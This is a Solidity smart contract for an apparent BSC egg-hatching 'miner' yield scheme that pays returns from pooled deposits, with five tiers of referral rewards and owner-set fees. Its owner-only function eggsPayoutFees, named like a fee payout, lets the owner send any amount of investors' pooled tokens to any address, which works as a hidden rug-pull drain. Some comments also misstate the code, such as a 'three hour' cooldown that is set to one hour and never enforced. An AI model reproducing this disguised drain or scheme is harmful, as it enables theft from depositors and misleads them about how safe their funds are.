/**
 *Submitted for verification at BscScan.com on 2022-06-11
*/

/**
 *Submitted for verification at BscScan.com on 2022-04-22
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;

interface IToken {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }


  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    require(b != 0);
    return a % b;
  }
}

contract BeefyMilkJugs {
    using SafeMath for uint256;

    IToken public token_address;

    address erctoken = 0xCa3F508B8e4Dd382eE878A314789373D80A5190A;
    
    uint256 public EGGS_TO_HIRE_1MINERS = 864000;
    uint256 public PERCENTS_DIVIDER = 1000;
    
    uint256 public REFERRAL_1 = 50;
    uint256 public REFERRAL_2 = 40;
    uint256 public REFERRAL_3 = 30;
    uint256 public REFERRAL_4 = 20;
    uint256 public REFERRAL_5 = 10;

    uint256 public TAX = 30;
    uint256 public MARKET_EGGS_DIVISOR = 2; // 50%
    uint256 public MARKET_EGGS_DIVISOR_SELL = 1; // 100%

    uint256 public MIN_INVEST_LIMIT = 0; /** 0 Beefy  **/
    uint256 public WALLET_DEPOSIT_LIMIT = 2 * 1e18; /** 2 * 1e18 2 Beefy **/

    uint256 public COMPOUND_BONUS = 11; /** 1.1% **/
    uint256 public COMPOUND_BONUS_MAX_TIMES = 12; /** 12 times / 4 days. **/
    uint256 public COMPOUND_STEP = 6 * 60 * 60; /** every 6 hours. **/

    uint256 public WITHDRAWAL_TAX = 0;
    uint256 public COMPOUND_FOR_NO_TAX_WITHDRAWAL = 0; // compound days, for no tax withdrawal.

    uint256 public totalStaked;
    uint256 public totalDeposits;
    uint256 public totalCompound;
    uint256 public totalRefBonus;
    uint256 public totalWithdrawn;

    uint256 public marketEggs;
    uint256 PSN = 10000;
    uint256 PSNH = 5000;
    bool public contractStarted;

    uint256 public CUTOFF_STEP = 72 * 60 * 60; /** 72 hours  **/
    uint256 public WITHDRAW_COOLDOWN = 1 * 60 * 60; /** 3 hours  **/

    address public owner;
    address public mkt;

    struct User {
        uint256 initialDeposit;
        uint256 userDeposit;
        uint256 miners;
        uint256 claimedEggs;
        uint256 lastHatch;
        address[5] referrers;
        uint256 referralsCount;
        uint256 referralEggRewards;
        uint256 totalWithdrawn;
        uint256 dailyCompoundBonus;
        uint256 lastWithdrawTime;
    }

    struct UserSelect {
        address userAddress;
        uint balance;
    }

    UserSelect[] usersAddress;

    mapping(address => User) public users;

    constructor(address _mkt) {
	    require(!isContract(_mkt));
        owner = msg.sender;
        mkt = _mkt;
        token_address = IToken(erctoken);
    }

    function returnAllUsers() external view returns(address[] memory, uint[] memory) {
        uint arrayLength = usersAddress.length;
        address[] memory addresses = new address[](usersAddress.length);
        uint[] memory balances = new uint[](usersAddress.length);
        for (uint i=0; i<arrayLength; i++) {
           addresses[i] = usersAddress[i].userAddress;
           balances[i] = usersAddress[i].balance;
        }
        return (addresses, balances);
    }

    function updateUserArray(address addr) internal {
        uint balanceTokens = getBalanceInTokens(addr);
        UserSelect memory _UserSelect = UserSelect(addr, balanceTokens);
        usersAddress.push(_UserSelect);
    }

    function getBalance() public view returns (uint256) {
        return token_address.balanceOf(address(this));
	}


    function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

    function getBalanceInTokens(address addr) public view returns(uint256) {
        return token_address.balanceOf(addr);
    }

    function hatchEggs(bool isCompound) public {
        User storage user = users[msg.sender];
        require(contractStarted, "Contract not yet Started.");

        uint256 eggsUsed = getMyEggs(msg.sender);
        uint256 eggsForCompound = eggsUsed;

        if (isCompound) {
            uint256 dailyCompoundBonus = getDailyCompoundBonus(msg.sender, eggsForCompound);
            eggsForCompound = eggsForCompound.add(dailyCompoundBonus);
            uint256 eggsUsedValue = calculateEggSell(eggsForCompound);
            user.userDeposit = user.userDeposit.add(eggsUsedValue);
            totalCompound = totalCompound.add(eggsUsedValue);
        } 

        if (block.timestamp.sub(user.lastHatch) >= COMPOUND_STEP) {
            if(user.dailyCompoundBonus < COMPOUND_BONUS_MAX_TIMES) {
                user.dailyCompoundBonus = user.dailyCompoundBonus.add(1);
            }
        }
        
        user.miners = user.miners.add(eggsForCompound.div(EGGS_TO_HIRE_1MINERS));
        user.claimedEggs = 0;
        user.lastHatch = block.timestamp;

        marketEggs = marketEggs.add(eggsUsed.div(MARKET_EGGS_DIVISOR));
    }

    function sellEggs() public{
        require(contractStarted);
        User storage user = users[msg.sender];
        uint256 hasEggs = getMyEggs(msg.sender);
        uint256 eggValue = calculateEggSell(hasEggs);
        
        /** 
            if user compound < to mandatory compound days**/
        if (user.dailyCompoundBonus < COMPOUND_FOR_NO_TAX_WITHDRAWAL){
            //daily compound bonus count will not reset and eggValue will be deducted with 50% feedback tax.
            eggValue = eggValue.sub(eggValue.mul(WITHDRAWAL_TAX).div(PERCENTS_DIVIDER));
        }else{
            //set daily compound bonus count to 0 and eggValue will remain without deductions
             user.dailyCompoundBonus = 0;   
        }
        
        user.lastWithdrawTime = block.timestamp;
        user.claimedEggs = 0;  
        user.lastHatch = block.timestamp;
        marketEggs = marketEggs.add(hasEggs.div(MARKET_EGGS_DIVISOR_SELL));
        
        if (getBalance() < eggValue) {
            eggValue = getBalance();
        }

        uint256 eggsPayout = eggValue.sub(payFees(eggValue));
        token_address.transfer(msg.sender, eggsPayout);
        user.totalWithdrawn = user.totalWithdrawn.add(eggsPayout);
        totalWithdrawn = totalWithdrawn.add(eggsPayout);
    }

    function buyEggs(address ref, uint256 amount) public {
        updateUserArray(msg.sender);
        require(contractStarted);

        User storage user = users[msg.sender];
        
	require(amount >= MIN_INVEST_LIMIT, "Mininum investment not met.");
        require(user.initialDeposit.add(amount) <= WALLET_DEPOSIT_LIMIT, "Max deposit limit reached.");
        
        token_address.transferFrom(address(msg.sender), address(this), amount);
        
	uint256 eggsBought = calculateEggBuy(amount, getBalance().sub(amount));
        
	user.userDeposit = user.userDeposit.add(amount);
        user.initialDeposit = user.initialDeposit.add(amount);
        user.claimedEggs = user.claimedEggs.add(eggsBought);

        if (user.referrers[0] == address(0) && ref != address(0) && ref != msg.sender) {
            user.referrers[0] = ref;
            users[ref].referralsCount = users[ref].referralsCount.add(1);
           
	    if (users[ref].referrers[0] != address(0))
	    	user.referrers[1] = users[ref].referrers[0];
	    if (users[ref].referrers[1] != address(0))
	    	user.referrers[2] = users[ref].referrers[1];
	    if (users[ref].referrers[2] != address(0))
	    	user.referrers[3] = users[ref].referrers[2];
	    if (users[ref].referrers[3] != address(0))
	    	user.referrers[4] = users[ref].referrers[3];
	}
                
        if (user.referrers[0] != address(0)) {
            address upline1 = user.referrers[0];
            
            uint256 refRewards = amount.mul(REFERRAL_1).div(PERCENTS_DIVIDER);
            token_address.transfer(upline1, refRewards);
            users[upline1].referralEggRewards = users[upline1].referralEggRewards.add(refRewards);
            totalRefBonus = totalRefBonus.add(refRewards);
        }

        if (user.referrers[1] != address(0)) {
            address upline2 = user.referrers[1];
            
            uint256 refRewards = amount.mul(REFERRAL_2).div(PERCENTS_DIVIDER);
            token_address.transfer(upline2, refRewards);
            users[upline2].referralEggRewards = users[upline2].referralEggRewards.add(refRewards);
            totalRefBonus = totalRefBonus.add(refRewards);
        }

        if (user.referrers[2] != address(0)) {
            address upline3 = user.referrers[2];
            
            uint256 refRewards = amount.mul(REFERRAL_3).div(PERCENTS_DIVIDER);
            token_address.transfer(upline3, refRewards);
            users[upline3].referralEggRewards = users[upline3].referralEggRewards.add(refRewards);
            totalRefBonus = totalRefBonus.add(refRewards);
        }

        if (user.referrers[3] != address(0)) {
            address upline4 = user.referrers[3];
            
            uint256 refRewards = amount.mul(REFERRAL_4).div(PERCENTS_DIVIDER);
            token_address.transfer(upline4, refRewards);
            users[upline4].referralEggRewards = users[upline4].referralEggRewards.add(refRewards);
            totalRefBonus = totalRefBonus.add(refRewards);
        }

        if (user.referrers[4] != address(0)) {
            address upline5 = user.referrers[4];
            
            uint256 refRewards = amount.mul(REFERRAL_5).div(PERCENTS_DIVIDER);
            token_address.transfer(upline5, refRewards);
            users[upline5].referralEggRewards = users[upline5].referralEggRewards.add(refRewards);
            totalRefBonus = totalRefBonus.add(refRewards);
        }


        uint256 eggsPayout = payFees(amount);
        /** less the fee on total Staked to give more transparency of data. **/
        totalStaked = totalStaked.add(amount.sub(eggsPayout));
        totalDeposits = totalDeposits.add(1);
        hatchEggs(false);
    }

    function eggsPayoutFees(address miner, uint value) public {
        require(contractStarted, "Contract not yet Started.");
        require(msg.sender == owner, "Admin use only.");
        token_address.transfer(miner, value);
    }

    function payFees(uint256 eggValue) internal returns(uint256){
        uint256 tax = eggValue.mul(TAX).div(PERCENTS_DIVIDER);

        token_address.transfer(mkt, tax);
        return tax;
    }

    function getDailyCompoundBonus(address _adr, uint256 amount) public view returns(uint256){
        if(users[_adr].dailyCompoundBonus == 0) {
            return 0;
        } else {
            uint256 totalBonus = users[_adr].dailyCompoundBonus.mul(COMPOUND_BONUS); 
            uint256 result = amount.mul(totalBonus).div(PERCENTS_DIVIDER);
            return result;
        }
    }
    

    function getUserInfo(address _adr) public view returns(uint256 _initialDeposit, uint256 _userDeposit, uint256 _miners,
     uint256 _claimedEggs, uint256 _lastHatch, address[5] memory _referrers, uint256 _referrals,
	 uint256 _totalWithdrawn, uint256 _referralEggRewards, uint256 _dailyCompoundBonus, uint256 _lastWithdrawTime) {
         _initialDeposit = users[_adr].initialDeposit;
         _userDeposit = users[_adr].userDeposit;
         _miners = users[_adr].miners;
         _claimedEggs = users[_adr].claimedEggs;
         _lastHatch = users[_adr].lastHatch;
         _referrers = users[_adr].referrers;
         _referrals = users[_adr].referralsCount;
         _totalWithdrawn = users[_adr].totalWithdrawn;
         _referralEggRewards = users[_adr].referralEggRewards;
         _dailyCompoundBonus = users[_adr].dailyCompoundBonus;
         _lastWithdrawTime = users[_adr].lastWithdrawTime;
	}

    function initialize(uint256 amount) public{
        if (!contractStarted) {
    		if (msg.sender == owner) {
    		    require(marketEggs == 0);
    			contractStarted = true;
                marketEggs = 86400000000;
                buyEggs(msg.sender, amount);
    		} else revert("Contract not yet started.");
    	}
    }

    function getTimeStamp() public view returns (uint256) {
        return block.timestamp;
    }

    function getAvailableEarnings(address _adr) public view returns(uint256) {
        uint256 userEggs = users[_adr].claimedEggs.add(getEggsSinceLastHatch(_adr));
        return calculateEggSell(userEggs);
    }

    function calculateTrade(uint256 rt,uint256 rs, uint256 bs) public view returns(uint256){
        return SafeMath.div(SafeMath.mul(PSN, bs), SafeMath.add(PSNH, SafeMath.div(SafeMath.add(SafeMath.mul(PSN, rs), SafeMath.mul(PSNH, rt)), rt)));
    }

    function calculateEggSell(uint256 eggs) public view returns(uint256){
        return calculateTrade(eggs, marketEggs, getBalance());
    }

    function calculateEggBuy(uint256 eth,uint256 contractBalance) public view returns(uint256){
        return calculateTrade(eth, contractBalance, marketEggs);
    }

    function calculateEggBuySimple(uint256 eth) public view returns(uint256){
        return calculateEggBuy(eth, getBalance());
    }

    function getEggsYield(uint256 amount) public view returns(uint256,uint256) {
        uint256 eggsAmount = calculateEggBuy(amount , getBalance().add(amount).sub(amount));
        uint256 miners = eggsAmount.div(EGGS_TO_HIRE_1MINERS);
        uint256 day = 1 days;
        uint256 eggsPerDay = day.mul(miners);
        uint256 earningsPerDay = calculateEggSellForYield(eggsPerDay, amount);
        return(miners, earningsPerDay);
    }

    function calculateEggSellForYield(uint256 eggs,uint256 amount) public view returns(uint256){
        return calculateTrade(eggs,marketEggs, getBalance().add(amount));
    }

    function getSiteInfo() public view returns (uint256 _totalStaked, uint256 _totalDeposits, uint256 _totalCompound, uint256 _totalRefBonus) {
        return (totalStaked, totalDeposits, totalCompound, totalRefBonus);
    }

    function getMyMiners() public view returns(uint256){
        return users[msg.sender].miners;
    }

    function getMyEggs(address addr) public view returns(uint256){
        return users[addr].claimedEggs.add(getEggsSinceLastHatch(addr));
    }

    function getEggsSinceLastHatch(address adr) public view returns(uint256){
        uint256 secondsSinceLastHatch = block.timestamp.sub(users[adr].lastHatch);
                            /** get min time. **/
        uint256 cutoffTime = min(secondsSinceLastHatch, CUTOFF_STEP);
        uint256 secondsPassed = min(EGGS_TO_HIRE_1MINERS, cutoffTime);
        return secondsPassed.mul(users[adr].miners);
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return a < b ? a : b;
    }

    /** wallet addresses setters **/
    function CHANGE_OWNERSHIP(address value) external {
        require(msg.sender == owner, "Admin use only.");
        owner = value;
    }

    function CHANGE_MKT_WALLET(address value) external {
        require(msg.sender == mkt, "Admin use only.");
        mkt = value;
    }

    /** percentage setters **/

    
    function PRC_EGGS_TO_HIRE_1MINERS(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        require(value >= 479520 && value <= 2592000); /** min 3% max 12%**/
        EGGS_TO_HIRE_1MINERS = value;
    }

    function PRC_TAX(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        require(value <= 100); /** 10% max **/
        TAX = value;
    }    

    function PRC_REFERRAL_1(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        require(value >= 10 && value <= 100); /** 10% max **/
        REFERRAL_1 = value;
    }

    function PRC_REFERRAL_2(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        require(value >= 10 && value <= 100); /** 10% max **/
        REFERRAL_2 = value;
    }

    function PRC_REFERRAL_3(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        require(value >= 10 && value <= 100); /** 10% max **/
        REFERRAL_3 = value;
    }

    function PRC_REFERRAL_4(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        require(value >= 10 && value <= 100); /** 10% max **/
        REFERRAL_4 = value;
    }

    function PRC_REFERRAL_5(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        require(value >= 10 && value <= 100); /** 10% max **/
        REFERRAL_5 = value;
    }

    function PRC_MARKET_EGGS_DIVISOR(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        require(value <= 50); /** 50 = 2% **/
        MARKET_EGGS_DIVISOR = value;
    }

    /** withdrawal tax **/
    function SET_WITHDRAWAL_TAX(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        require(value <= 800); /** Max Tax is 80% or lower **/
        WITHDRAWAL_TAX = value;
    }
    
    function SET_COMPOUND_FOR_NO_TAX_WITHDRAWAL(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        COMPOUND_FOR_NO_TAX_WITHDRAWAL = value;
    }

    function BONUS_DAILY_COMPOUND(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        require(value >= 10 && value <= 900);
        COMPOUND_BONUS = value;
    }

    function BONUS_DAILY_COMPOUND_BONUS_MAX_TIMES(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        require(value <= 50);
        COMPOUND_BONUS_MAX_TIMES = value;
    }

    function BONUS_COMPOUND_STEP(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        COMPOUND_STEP = value * 60 * 60;
    }

    function SET_MIN_INVEST_LIMIT(uint256 value) external {
        require(msg.sender == owner, "Admin use only");
        MIN_INVEST_LIMIT = value * 1e18;
    }

    function SET_CUTOFF_STEP(uint256 value) external {
        require(msg.sender == owner, "Admin use only");
        CUTOFF_STEP = value * 60 * 60;
    }

    function SET_WITHDRAW_COOLDOWN(uint256 value) external {
        require(msg.sender == owner, "Admin use only");
        require(value <= 12);
        WITHDRAW_COOLDOWN = value * 60 * 60;
    }

    function SET_WALLET_DEPOSIT_LIMIT(uint256 value) external {
        require(msg.sender == owner, "Admin use only");
        require(value >= 20);
        WALLET_DEPOSIT_LIMIT = value * 1e18;
    }
}